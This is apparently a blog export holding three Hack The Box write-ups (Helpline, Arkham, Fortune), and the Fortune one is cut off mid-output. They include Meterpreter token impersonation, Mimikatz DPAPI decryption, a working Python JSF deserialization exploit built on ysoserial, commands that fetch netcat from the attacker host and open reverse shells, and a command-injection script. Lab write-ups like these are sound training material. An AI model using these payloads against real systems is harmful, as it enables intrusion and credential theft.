 Name   --  ----   0   Wildcard Targetmsf5 exploit(multi/handler) &gt; run -j[*] Exploit running as background job 0.[*] Started reverse TCP handler on 10.10.14.23:7777msf5 exploit(multi/handler) &gt; sessions 2[*] Starting interaction with 2...meterpreter &gt; getuidServer username: NT AUTHORITY\\SYSTEMmeterpreter &gt; load incognitoLoading extension incognito...Success.meterpreter &gt; list_tokens -uDelegation Tokens Available========================================Font Driver Host\\UMFD-0Font Driver Host\\UMFD-1HELPLINE\\aliceHELPLINE\\leoNT AUTHORITY\\LOCAL SERVICENT AUTHORITY\\NETWORK SERVICENT AUTHORITY\\SYSTEMWindow Manager\\DWM-1Impersonation Tokens Available========================================No tokens availableWe see that Leo’s token is in memory so we can impersonate him and download the admin-pass.xml file.meterpreter &gt; impersonate_token helpline\\\\leo[+] Delegation token available[+] Successfully impersonated user HELPLINE\\leometerpreter &gt; shellProcess 4428 created.Channel 1 created.Microsoft Windows [Version 10.0.17763.253](c) 2018 Microsoft Corporation. All rights reserved.C:\\ProgramData&gt;whoamiwhoamihelpline\\leoC:\\Users\\leo\\Desktop&gt;type admin-pass.xmltype admin-pass.xml01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f2fefa98a0d84f4b917dd8a1f5889c8100000000020000000000106600000001000020000000c2d2dd6646fb78feb6f7920ed36b0ade40efeaec6b090556fe6efb52a7e847cc000000000e8000000002000020000000c41d656142bd869ea7eeae22fc00f0f707ebd676a7f5fe04a0d0932dffac3f48300000006cbf505e52b6e132a07de261042bcdca80d0d12ce7e8e60022ff8d9bc042a437a1c49aa0c7943c58e802d1c758fc5dd340000000c4a81c4415883f937970216c5d91acbf80def08ad70a02b061ec88c9bb4ecd14301828044fefc3415f5e128cfb389cbe8968feb8785914070e8aebd6504afcaaThis looks like a Powershell SecureString. Looking at https://stackoverflow.com/questions/28352141/convert-a-secure-string-to-plain-text we can find a method to decrypt the SecureString and recover the plaintext. Since we are running with Leo’s token, we already have the decryption key loaded in memory.C:\\Users\\leo\\Desktop&gt;powershellpowershellWindows PowerShellCopyright (C) Microsoft Corporation. All rights reserved.PS C:\\Users\\leo\\Desktop&gt; whoamiwhoamihelpline\\leoPS C:\\Users\\leo\\Desktop&gt;PS C:\\Users\\leo\\Desktop&gt; $SecurePassword = Get-Content admin-pass.xml | ConvertTo-SecureStringPS C:\\Users\\leo\\Desktop&gt; $UnsecurePassword = (New-Object PSCredential \"administrator\",$SecurePassword).GetNetworkCredential().PasswordPS C:\\Users\\leo\\Desktop&gt; echo $UnsecurePasswordmb@letmein@SERVER#accWe just found the administrator’s password: mb@letmein@SERVER#accDecrypting the root.txt flagNow that we have plaintext password for administrator, we can use Mimikatz to decrypt the master key and recover the private key for the administrator user.I followed the https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files guide for this part.Step 1. Get the certificatecrypto::system /file:\"C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\SystemCertificates\\My\\Certificates\\FB154575993A250FE826DBAC79EF26C211CB77B3\" /export[...]Saved to file: FB154575993A250FE826DBAC79EF26C211CB77B3.derStep 2. Decrypt the master keydpapi::masterkey /in:\"C:\\users\\administrator\\appdata\\roaming\\microsoft\\protect\\S-1-5-21-3107372852-1132949149-763516304-500\\9e78687d-d881-4ccb-8bd8-bc0a19608687\" /pass:mb@letmein@SERVER#acc[...][masterkey] with password: mb@letmein@SERVER#acc (normal user)key : 8ed6519c4d09a506504c4f611203bea8979a385f8a444fe57b5d2256ee1e4eb34392a141f502cd9aeea8d2187c2525c3ae998dc3cebad81cc4e41dbb6bc65fa8sha1: b18974052cb509a86a008869fd95388550678184Step 3. Decrypt the private keydpapi::capi /in:\"C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\S-1-5-21-3107372852-1132949149-763516304-500\\d1775a874937ca4b3cd9b8e334588333_86f90bf3-9d4c-47b0-bc79-380521b14c85\" /masterkey:b18974052cb509a86a008869fd95388550678184[...]Exportable key : YESKey size       : 2048Private export : OK - 'raw_exchange_capi_0_3dd3e213-bce6-4acb-808c-a1b3227ecbde.pvk'Step 4. Build &amp; import the correct PFXI downloaded the files to my Kali VM then used the following commands to build the PFX file:openssl x509 -inform DER -outform PEM -in FB154575993A250FE826DBAC79EF26C211CB77B3.der -out public.pemopenssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_3dd3e213-bce6-4acb-808c-a1b3227ecbde.pvk -out private.pemopenssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfxNext, I uploaded the cert.pfx file to the target box.Step 5. Get the flagC:\\ProgramData&gt;certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRootCertificate \"Administrator\" added to store.CertUtil: -importPFX command completed successfully.C:\\ProgramData&gt;type c:\\users\\administrator\\desktop\\root.txtd8142...Looking for the tolu user passwordI downloaded all the Windows log files from c:\\windows\\system32\\winevt\\logs to my Kali VM and used the following Python module to parse them https://github.com/williballenthin/python-evtx.# evtx_dump.py Security.evtx | grep tolu&lt;EventData&gt;&lt;Data Name=\"TargetUserName\"&gt;tolu&lt;/Data&gt;&lt;EventData&gt;&lt;Data Name=\"TargetUserName\"&gt;tolu&lt;/Data&gt;&lt;Data Name=\"CommandLine\"&gt;\"C:\\Windows\\system32\\net.exe\" use T: \\\\helpline\\helpdesk_stats /USER:tolu !zaq1234567890pl!99&lt;/Data&gt;The log file contains the tolu user password: !zaq1234567890pl!99Now we can repeat the same Mimikatz process for this user and get the user.txt flag:C:\\ProgramData&gt;certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRootCertificate \"tolu\" added to store.CertUtil: -importPFX command completed successfully.C:\\ProgramData&gt;type c:\\users\\tolu\\desktop\\user.txt0d522f..."
  },
  
  {
    "title": "Arkham - Hack The Box",
    "url": "/posts/htb-writeup-arkham/",
    "categories": "hackthebox, infosec",
    "tags": "java, deserialization, smb, luks, readpst, unintended",
    "date": "2019-08-10 00:00:00 +0800",
    





    
    "snippet": "Arkham was a medium difficulty box that shows how Java deserialization can be used by attackers to get remote code execution. After finding the JSF viewstates encryption key in a LUKS encrypted fil...",
    "content": "Arkham was a medium difficulty box that shows how Java deserialization can be used by attackers to get remote code execution. After finding the JSF viewstates encryption key in a LUKS encrypted file partition, I created a Java deserialization payload using ysoserial to upload netcat and get a shell. After getting to user Batman with credentials found in a backup file, I was able to get access to the administrator directory by mounting the local c: drive via SMB instead of doing a proper UAC bypass.Summary  There’s an open SMB share where I find an appserver.zip file that contains a LUKS encrypted file partition  After extracting the LUKS hash from the image file, I am able to crack it with hashcat  I then mount the image and find the JSF app configuration files  One of the file reveals the MAC secret for the JSF viewstates encryption  I contruct an exploit that uses an already existing payload generator for JSF ViewStates and gain RCE  I download netcat through powershell using the exploit then execute it to get a reverse shell  The user alfred has a backup.zip file that contains an image with the batman user password  I can get access as batman by using WinRM locally but I can’t view the admin’s directory because of UAC  The unintended way to solve this one was to mount the local drive and read the system flag, therefore bypassing UACBlog / Tools  https://articles.forensicfocus.com/2018/02/22/bruteforcing-linux-full-disk-encryption-luks-with-hashcat/  https://hackernoon.com/cracking-linux-full-disc-encryption-luks-with-hashcat-832d554310  https://github.com/frohoff/ysoserial  https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.htmlNmap# nmap -sC -sV -p- 10.10.10.130Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-16 22:32 EDTNmap scan report for arkham.htb (10.10.10.130)Host is up (0.0080s latency).Not shown: 65528 filtered portsPORT      STATE SERVICE       VERSION80/tcp    open  http          Microsoft IIS httpd 10.0| http-methods:|_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS Windows Server135/tcp   open  msrpc         Microsoft Windows RPC139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn445/tcp   open  microsoft-ds?8080/tcp  open  http          Apache Tomcat 8.5.37| http-methods:|_  Potentially risky methods: PUT DELETE|_http-open-proxy: Proxy might be redirecting requests|_http-title: Mask Inc.49666/tcp open  msrpc         Microsoft Windows RPC49667/tcp open  msrpc         Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsWeb enum - IIS on port 80I just get the standard default IIS web page when I go to port 80.I didn’t find anything when dirbusting it.Web enum - Apache Tomcat on port 8080The Apache Tomcat page is much more interesting, it’s a company’s front page with a subscription and contact form.Most of the links are not functional, but to make sure I didn’t miss anything I spidered the website with Burp:The userSubscribe.faces file is the Subscribe link on the main page.The .faces extension is used by JavaServer FacesAccording to Wikipedia:  JavaServer Faces (JSF) is a Java specification for building component-based user interfaces for web applications[1] and was formalized as a standard through the Java Community Process being part of the Java Platform, Enterprise Edition. It is also a MVC web framework that simplifies construction of user interfaces (UI) for server-based applications by using reusable UI components in a page.I’ll get back to that after the SMB enumeration, this is the way in.SMB enumerationI’ll use smbmap to quickly scan for accessible shares. I’m using an invalid username here so it connects as guest and not using a null session.# smbmap -u snowscan -H 10.10.10.130[+] Finding open SMB ports....[+] Guest SMB session established on 10.10.10.130...[+] IP: 10.10.10.130:445\tName: arkham.htb\tDisk                                                  \tPermissions\t----                                                  \t-----------\tADMIN$                                            \tNO ACCESS\tBatShare                                          \tREAD ONLY\tC$                                                \tNO ACCESS\tIPC$                                              \tREAD ONLY\tUsers                                             \tREAD ONLYBatShare is accessible in read-only mode and there is a single file in there.# smbmap -u snowscan -r BatShare -H 10.10.10.130[+] Finding open SMB ports....[+] Guest SMB session established on 10.10.10.130...[+] IP: 10.10.10.130:445\tName: arkham.htb\tDisk                                                  \tPermissions\t----                                                  \t-----------\tBatShare                                          \tREAD ONLY\t./\tdr--r--r--                0 Sun Feb  3 08:04:13 2019\t.\tdr--r--r--                0 Sun Feb  3 08:04:13 2019\t..\tfr--r--r--          4046695 Sun Feb  3 08:04:13 2019\tappserver.zipDownloading the file using smbmap:# smbmap -u snowscan --download BatShare\\\\appserver.zip -H 10.10.10.130[+] Finding open SMB ports....[+] Guest SMB session established on 10.10.10.130...[+] Starting download: BatShare\\appserver.zip (4046695 bytes)[+] File output to: /usr/share/smbmap/10.10.10.130-BatShare_appserver.zipExtracting and checking the content:# 7z e 10.10.10.130-BatShare_appserver.zip7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-2600K CPU @ 3.40GHz (206A7),ASM,AES-NI)Scanning the drive for archives:1 file, 4046695 bytes (3952 KiB)Extracting archive: 10.10.10.130-BatShare_appserver.zip--Path = 10.10.10.130-BatShare_appserver.zipType = zipPhysical Size = 4046695Everything is OkFiles: 2Size:       13631637Compressed: 4046695# ls -ltotal 17268-rw-r--r-- 1 root root  4046695 Mar 16 23:24 10.10.10.130-BatShare_appserver.zip-rw-r--r-- 1 root root 13631488 Dec 25 01:05 backup.img-rw-r--r-- 1 root root      149 Dec 25 01:21 IMPORTANT.txtI check the IMPORTANT.txt message first and see that it contains a hint that the backup.img file is protected.# cat IMPORTANT.txtAlfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - BruceI then check what kind of file this is and see that it is a LUKS encrypted file:# file backup.imgbackup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e  The Linux Unified Key Setup (LUKS) is a disk encryption specification created by Clemens Fruhwirth in 2004 and originally intended for Linux.Cracking and looking inside LUKS containerI can extract the beginning of the partition containing the header so I can crack it with hashcat after:# dd if=backup.img of=backup_header.dd bs=512 count=50005000+0 records in5000+0 records out2560000 bytes (2.6 MB, 2.4 MiB) copied, 0.0232298 s, 110 MB/sNow I can crack it with hashcat:C:\\bin\\hashcat&gt;hashcat64 -m 14600 -a 0 -w 3 backup_header.dd passwords\\rockyou.txthashcat (v5.1.0) starting...[...]backup_header.dd:batmanforeverThe password is batmanforeverTo mount the image I first open the image file and assign it to the device mapper, then mount it under /mnt:# cryptsetup luksOpen backup.img backupEnter passphrase for backup.img: [batmanforever]# mount /dev/mapper/backup /mntroot@ragingunicorn:/mnt/Mask# ls -lR.:total 880drwxr-xr-x 2 root root   1024 Dec 25 00:22 docs-rw-rw-r-- 1 root root  96978 Dec 25 00:18 joker.png-rw-rw-r-- 1 root root 105374 Dec 25 00:20 me.jpg-rw-rw-r-- 1 root root 687160 Dec 25 00:20 mycar.jpg-rw-rw-r-- 1 root root   7586 Dec 25 00:19 robin.jpegdrwxr-xr-x 2 root root   1024 Dec 25 00:24 tomcat-stuff./docs:total 196-rw-r--r-- 1 root root 199998 Jun 15  2017 Batman-Begins.pdf./tomcat-stuff:total 191-rw-r--r-- 1 root root   1368 Dec 25 00:23 context.xml-rw-r--r-- 1 root root    832 Dec 25 00:24 faces-config.xml-rw-r--r-- 1 root root   1172 Dec 25 00:23 jaspic-providers.xml-rw-r--r-- 1 root root     39 Dec 25 00:24 MANIFEST.MF-rw-r--r-- 1 root root   7678 Dec 25 00:23 server.xml-rw-r--r-- 1 root root   2208 Dec 25 00:23 tomcat-users.xml-rw-r--r-- 1 root root 174021 Dec 25 00:23 web.xml-rw-r--r-- 1 root root   3498 Dec 25 00:24 web.xml.bakSo I have a bunch of files in there, I’ll concentrate on the xml files.In the web.xml.bak file, I find the encryption key for the ViewState. I can use this to construct my own serialized objects and pass them to the server to gain RCE.&lt;param-name&gt;org.apache.myfaces.SECRET&lt;/param-name&gt;&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;&lt;/context-param&gt;    &lt;context-param&gt;        &lt;param-name&gt;org.apache.myfaces.MAC_ALGORITHM&lt;/param-name&gt;        &lt;param-value&gt;HmacSHA1&lt;/param-value&gt;     &lt;/context-param&gt;&lt;context-param&gt;&lt;param-name&gt;org.apache.myfaces.MAC_SECRET&lt;/param-name&gt;&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;&lt;/context-param&gt;Java Server Faces object deserialization exploitI’ll use ysoserial to generate the payload, then write some python to calculate the hmac based on the key provided in the web.xml.bak file.#!/usr/bin/pythonfrom base64 import b64encodefrom hashlib import sha1from pwn import *from requests import post, getimport hmacimport osimport pyDesimport sysdef main():    if len(sys.argv) &lt; 4:        print(\"Java JSF exploit\")        print(\"Usage: {} &lt;url&gt; &lt;cmd&gt; &lt;secret&gt;\\n\".format(sys.argv[0]))        sys.exit()    url = sys.argv[1]    cmd = sys.argv[2]    secret = sys.argv[3]    log.info(\"Payload provided: {}\".format(cmd))    cmd = \"java -jar ./ysoserial.jar CommonsCollections6 \\\"{}\\\" &gt; payload.bin\".format(cmd)    log.info(\"Generating the payload with: {}\".format(cmd))    os.system(cmd)    log.info(\"Payload was written to payload.bin, reading it into variable...\")    with open(\"payload.bin\", \"rb\") as f:        payload = f.read()    log.info(\"Length of payload: {} bytes\".format(len(payload)))    key = bytes(secret).decode(\"base64\")    des = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)    enc = des.encrypt(payload)    b = hmac.new(key, bytes(enc), sha1).digest()    payload = enc + b    log.info(\"Sending encoded payload: {}\".format(b64encode(payload)))    data = {\"javax.faces.ViewState\": b64encode(payload)}    r = post(url, data=data)    log.success(\"Done!\")if __name__ == \"__main__\":    main()To get a reverse shell, I’ll generate a payload that downloads netcat from my machine and store in it c:\\programdata. I’m a fan of using netcat whenever possible for these types of challenges so I don’t need to debug Powershell payloads, etc. It’s certainly not stealthy or elegant but it’s good enough for me here.# python boom.py http://10.10.10.130:8080/userSubscribe.faces \"powershell -command \\\\\\\"Invoke-WebRequest -Uri http://10.10.14.23/nc.exe -outfile \\\\programdata\\\\nc.exe\\\\\\\"\" SnNGOTg3Ni0=[*] Payload provided: powershell -command \\\"Invoke-WebRequest -Uri http://10.10.14.23/nc.exe -outfile \\programdata\\nc.exe\\\"[*] Generating the payload with: java -jar ./ysoserial.jar CommonsCollections6 \"powershell -command \\\"Invoke-WebRequest -Uri http://10.10.14.23/nc.exe -outfile \\programdata\\nc.exe\\\"\" &gt; payload.binWARNING: An illegal reflective access operation has occurredWARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections6 (file:/root/htb/arkham/ysoserial.jar) to field java.util.HashSet.mapWARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections6WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operationsWARNING: All illegal access operations will be denied in a future release[*] Payload was written to payload.bin, reading it into variable...[*] Length of payload: 1372 bytes[*] Sending encoded payload: EpflyBhnLkAS/cI6nexhMqH/tMmK+e+oOSB+iGGStMf3iTfxuPA5PGNGhz6HO2nAZeudvUiuJvqiPb69whWbK2/EFMRkmhTDywwZ5O1KTeC46zdFOsXfLYOq+MjjY+tkAaxKM5Zb/[...][+] Done!The server retrieves the file from my VM:# python -m SimpleHTTPServer 80Serving HTTP on 0.0.0.0 port 80 ...10.10.10.130 - - [17/Mar/2019 00:11:35] \"GET /nc.exe HTTP/1.1\" 200 -Then I can execute netcat and get a shell:# python boom.py http://10.10.10.130:8080/userSubscribe.faces \"\\\\programdata\\\\nc.exe -e cmd.exe 10.10.14.23 4444\" SnNGOTg3Ni0=[*] Payload provided: \\programdata\\nc.exe -e cmd.exe 10.10.14.23 4444[*] Generating the payload with: java -jar ./ysoserial.jar CommonsCollections6 \"\\programdata\\nc.exe -e cmd.exe 10.10.14.23 4444\" &gt; payload.binWARNING: An illegal reflective access operation has occurredWARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections6 (file:/root/htb/arkham/ysoserial.jar) to field java.util.HashSet.mapWARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections6WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operationsWARNING: All illegal access operations will be denied in a future release[*] Payload was written to payload.bin, reading it into variable...[*] Length of payload: 1320 bytes[*] Sending encoded payload: EpflyBhnLkAS/cI6nexhMqH/tMmK+e+oOSB+iGGStMf3iTfxuPA5PGNGhz6HO2nAZeudvUiuJvqiPb69whWbK2/EFMRkmhTDywwZ5O1KTeC46zdFOsXfLYOq+MjjY+tkAaxKM5Zb/[...][+] Done!I get a shell and found user.txt:# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.130] 49686Microsoft Windows [Version 10.0.17763.107](c) 2018 Microsoft Corporation. All rights reserved.C:\\tomcat\\apache-tomcat-8.5.37\\bin&gt;whoamiarkham\\alfredC:\\tomcat\\apache-tomcat-8.5.37\\bin&gt;type c:\\users\\alfred\\desktop\\user.txtba6593...Elevate to user BatmanChecking local users, I find that batman is a member of local administrators so this is likely the next step.C:\\Users\\Alfred&gt;net usersUser accounts for \\\\ARKHAM-------------------------------------------------------------------------------Administrator            Alfred                   BatmanDefaultAccount           Guest                    WDAGUtilityAccountThe command completed successfully.C:\\Users\\Alfred&gt;net users batman[...]Local Group Memberships      *Administrators       *Remote Management Use                             *UsersGlobal Group memberships     *NoneThe command completed successfully.I find a backup file in Alfred’s Downloads directory.C:\\Users\\Alfred&gt;dir /s downloads Volume in drive C has no label. Volume Serial Number is FA90-3873 Directory of C:\\Users\\Alfred\\downloads02/03/2019  08:48 AM    &lt;DIR&gt;          .02/03/2019  08:48 AM    &lt;DIR&gt;          ..02/03/2019  08:41 AM    &lt;DIR&gt;          backups               0 File(s)              0 bytes Directory of C:\\Users\\Alfred\\downloads\\backups02/03/2019  08:41 AM    &lt;DIR&gt;          .02/03/2019  08:41 AM    &lt;DIR&gt;          ..02/03/2019  08:41 AM           124,257 backup.zip               1 File(s)        124,257 bytesI transferred the backup.zip file to my Kali box with netcat then checked its contents.# 7z e backup.zip# ls -ltotal 33816-rwx------ 1 root root 16818176 Feb  2 18:00 alfred@arkham.local.ostThis is an Outlook mailbox file and I can use readpst to read it instead of transferring it to my Windows VM.# readpst -S alfred@arkham.local.ostOpening PST file and indexes...Processing Folder \"Deleted Items\"Processing Folder \"Inbox\"Processing Folder \"Outbox\"Processing Folder \"Sent Items\"Processing Folder \"Calendar\"Processing Folder \"Contacts\"Processing Folder \"Conversation Action Settings\"Processing Folder \"Drafts\"Processing Folder \"Journal\"Processing Folder \"Junk E-Mail\"Processing Folder \"Notes\"Processing Folder \"Tasks\"Processing Folder \"Sync Issues\"\t\"Inbox\" - 0 items done, 7 items skipped.\t\"Calendar\" - 0 items done, 3 items skipped.Processing Folder \"RSS Feeds\"Processing Folder \"Quick Step Settings\"\t\"alfred@arkham.local.ost\" - 15 items done, 0 items skipped.Processing Folder \"Conflicts\"Processing Folder \"Local Failures\"Processing Folder \"Server Failures\"\t\"Sync Issues\" - 3 items done, 0 items skipped.\t\"Drafts\" - 1 items done, 0 items skipped.I now have the email extracted and a PNG image attachment.# ls -lR.:total 16drwxr-xr-x 2 root root 4096 Mar 17 00:35  Calendardrwxr-xr-x 2 root root 4096 Mar 17 00:35  Draftsdrwxr-xr-x 2 root root 4096 Mar 17 00:35  Inboxdrwxr-xr-x 2 root root 4096 Mar 17 00:35 'Sync Issues'./Calendar:total 0./Drafts:total 52-rw-r--r-- 1 root root 37968 Mar 17 00:35 1-rw-r--r-- 1 root root 10059 Mar 17 00:35 1-image001.pngThe email contains a reference to Batman’s password, which is in the attached image.&lt;p class=MsoNormal&gt;Master Wayne stop forgetting your password&lt;o:p&gt;&lt;/o:p&gt;&lt;/p&gt;The attachment contains a screenshot with Batman’s password:Password: Zx^#QZX+T!123Using WinRM I can start a powershell session as batman.C:\\Users\\Alfred&gt;powershellWindows PowerShellCopyright (C) Microsoft Corporation. All rights reserved.PS C:\\Users\\Alfred&gt; $username = 'batman'PS C:\\Users\\Alfred&gt; $password = 'Zx^#QZX+T!123'PS C:\\Users\\Alfred&gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -ForcePS C:\\Users\\Alfred&gt; $credential = New-Object System.Management.Automation.PSCredential $username, $securePasswordPS C:\\Users\\Alfred&gt; enter-pssession -computername arkham -credential $credential[arkham]: PS C:\\Users\\Batman\\Documents&gt;Something’s wrong though, I can’t change directories or see error messages:[arkham]: PS C:\\Users\\Batman\\Documents&gt; cd ..[arkham]: PS C:\\Users\\Batman\\Documents&gt; whoamiarkham\\batman[arkham]: PS C:\\Users\\Batman\\Documents&gt; cd \\users\\administrator\\desktopSo what I did was spawn another netcat as batman[arkham]: PS C:\\Users\\Batman\\Documents&gt; c:\\programdata\\nc.exe -e cmd.exe 10.10.14.23 6666# nc -lvnp 6666listening on [any] 6666 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.130] 49695Microsoft Windows [Version 10.0.17763.107](c) 2018 Microsoft Corporation. All rights reserved.C:\\Users\\Batman\\Documents&gt;whoamiarkham\\batmanUnintended way to get access to the Administrator user directoryI can’t get to the Administrator directory because UAC is enabled.With Powershell I can check the status of UAC and see that it is enabled:PS C:\\Users\\Batman\\Documents&gt; (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System).EnableLUA1For some reason, if I use UNC paths I can access to the administrator directory… So this is probably unintended by the box creator but it does get me the flag :)C:\\Users\\Batman\\Documents&gt;pushd \\\\10.10.10.130\\c$Z:\\&gt;cd \\users\\administrator\\desktopZ:\\Users\\Administrator\\Desktop&gt;dir Volume in drive Z has no label. Volume Serial Number is FA90-3873 Directory of Z:\\Users\\Administrator\\Desktop02/03/2019  09:32 AM    &lt;DIR&gt;          .02/03/2019  09:32 AM    &lt;DIR&gt;          ..02/03/2019  09:32 AM                70 root.txt               1 File(s)             70 bytes               2 Dir(s)   8,710,045,696 bytes freeZ:\\Users\\Administrator\\Desktop&gt;type root.txttype root.txt636783..."
  },
  
  {
    "title": "Fortune - Hack The Box",
    "url": "/posts/htb-writeup-fortune/",
    "categories": "hackthebox, infosec",
    "tags": "python, flask, command injection, certificate, nfs, port forward, ssh, postgresql, sqlite, pgadmin, openssl",
    "date": "2019-08-03 00:00:00 +0800",
    





    
    "snippet": "In this box, I use a simple command injection on the web fortune application that allows me to find the Intermediate CA certificate and its private key. After importing the certificates in Firefox,...",
    "content": "In this box, I use a simple command injection on the web fortune application that allows me to find the Intermediate CA certificate and its private key. After importing the certificates in Firefox, I can authenticate to the HTTPS page and access a privileged page that generates an SSH private key. Next is SSH port forwarding to access an NFS share, upload my SSH public key to escalate to another user, then recover a pgadmin database which contains the DBA password which is also the root password. Cool box overall, but it should have been rated Hard instead of Insane.Summary  There’s a command injection found in the db parameter of the web fortune application  The intermediate CA private key is found in a directory that I can access through the command injection  I can generate a client certificate that I will use to access the ssh authentication web page  After generating an SSH private keym, I can establish an SSH session as user nfsuser  By port-forwarding port 2049 I can mount the /home directory of the NFS server  With NFS I write my SSH public key into the charlie user directory and gain SSH access there  The pgadmin application database is exposed and I can recover the dba account password since I have the encrypted value and the decryption key  Based on a note found when I first got access, I know the dba password is the same as the root account and I can su to gain root accessDetailed stepsNmapThis box runs SSH and the OpenBSD httpd web server with both HTTP and HTTPS ports open.# nmap -sC -sV -p- -oA fortune fortune.htbStarting Nmap 7.70 ( https://nmap.org ) at 2019-03-09 19:01 ESTNmap scan report for fortune.htb (10.10.10.127)Host is up (0.012s latency).Not shown: 65532 closed portsPORT    STATE SERVICE    VERSION22/tcp  open  ssh        OpenSSH 7.9 (protocol 2.0)| ssh-hostkey:|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)80/tcp  open  http       OpenBSD httpd|_http-server-header: OpenBSD httpd|_http-title: Fortune443/tcp open  ssl/https?|_ssl-date: TLS randomness does not represent timeCommand injection on the fortune web appThe website shows a list of databases that I can select, then it runs the fortune application to return random quotes.From the man page:  fortune — print a random, hopefully interesting, adageThe fortune web app has a pretty trivial command injection vulnerability. It simply appends what I pass in the db parameter to the fortune application call. I can run arbitrary commands and programs simply by adding a semi-colon after the database name.The example here shows I can run id and list the root directory:Because I wasn’t sure how much time I’d need to spend poking around the system through that command injection vulnerability, I wrote a quick python script that runs commands and cleans up the output. The output of all commands is displayed to screen and also saved to output.txt.#!/usr/bin/pythonimport reimport readlineimport requestsf = open(\"output.txt\", \"a\")while True:    cmd = raw_input(\"&gt; \")    data = { \"db\": \";echo '****';{}\".format(cmd)}    r = requests.post(\"http://fortune.htb/select\", data=data)    m = re.search(\"\\*\\*\\*\\*(.*)&lt;/pre&gt;\", r.text, re.DOTALL)    if m:        print m.group(1)        f.write(\"CMD: {}\".format(cmd))        f.write(m.group(1))Here’s what the output looks like:&gt; ls -ltotal 56drwxrwxrwx  2 _fortune  _fortune    512 Nov  2 23:39 __pycache__-rw-r--r--  1 root      _fortune    341 Nov  2 22:58 fortuned.ini-rw-r-----  1 _fortune  _fortune  14581 Mar  9 19:03 fortuned.log-rw-rw-rw-  1 _fortune  _fortune      6 Mar  9 18:38 fortuned.pid-rw-r--r--  1 root      _fortune    413 Nov  2 22:59 fortuned.pydrwxr-xr-x  2 root      _fortune    512 Nov  2 22:57 templates-rw-r--r--  1 root      _fortune     67 Nov  2 22:59 wsgi.py&gt; tail -n 10 /etc/passwd_syspatch:*:112:112:syspatch unprivileged user:/var/empty:/sbin/nologin_slaacd:*:115:115:SLAAC Daemon:/var/empty:/sbin/nologin_postgresql:*:503:503:PostgreSQL Manager:/var/postgresql:/bin/sh_pgadmin4:*:511:511::/usr/local/pgadmin4:/usr/local/bin/bash_fortune:*:512:512::/var/appsrv/fortune:/sbin/nologin_sshauth:*:513:513::/var/appsrv/sshauth:/sbin/nologinnobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologincharlie:*:1000:1000:Charlie:/home/charlie:/bin/kshbob:*:1001:1001::/home/bob:/bin/kshnfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpfThe user _fortune has /sbin/nologin for his shell so I can’t just upload my SSH keys to get a real shell through SSH.Looking around the box as user _fortuneThe previous box by AuxSarge had some special SSH configuration that made use of a local database to check the public keys of users. The first thing I did on this box was check the SSH configuration to see if there was something similar:/etc/ssh/sshd_config has a special configuration for user nfuser that looks up the public key in a postgresql database instead of .sshMatch User nfsuser\tAuthorizedKeysFile none\tAuthorizedKeysCommand /usr/local/bin/psql -Aqt -c \"SELECT key from authorized_keys where uid = '%u';\" authpf appsrv\tAuthorizedKeysCommandUser _sshauthI spotted another web app in /var/appsrv/sshauth I didn’t find in my initial enumeration. It’s written in Python and running the Flask framework.&gt; ls -l /var/appsrvtotal 12drwxr-xr-x  4 _fortune   _fortune  512 Feb  3 05:08 fortunedrwxr-x---  4 _pgadmin4  wheel     512 Nov  3 10:58 pgadmin4drwxr-xr-x  4 _sshauth   _sshauth  512 Feb  3 05:08 sshauth&gt; ls -l /var/appsrv/sshauthtotal 52drwxrwxrwx  2 _sshauth  _sshauth    512 Nov  2 23:39 __pycache__-rw-r--r--  1 _sshauth  _sshauth    341 Nov  2 23:10 sshauthd.ini-rw-r-----  1 _sshauth  _sshauth  13371 Mar  9 18:39 sshauthd.log-rw-rw-rw-  1 _sshauth  _sshauth      6 Mar  9 18:38 sshauthd.pid-rw-r--r--  1 _sshauth  _sshauth   1799 Nov  2 23:12 sshauthd.pydrwxr-xr-x  2 _sshauth  _sshauth    512 Nov  2 23:08 templates-rw-r--r--  1 _sshauth  _sshauth     67 Nov  2 23:06 wsgi.pyI can see with ps that the application is running through uwsgi:&gt; ps waux | grep sshauth_sshauth 39927  0.0  2.5 19164 26268 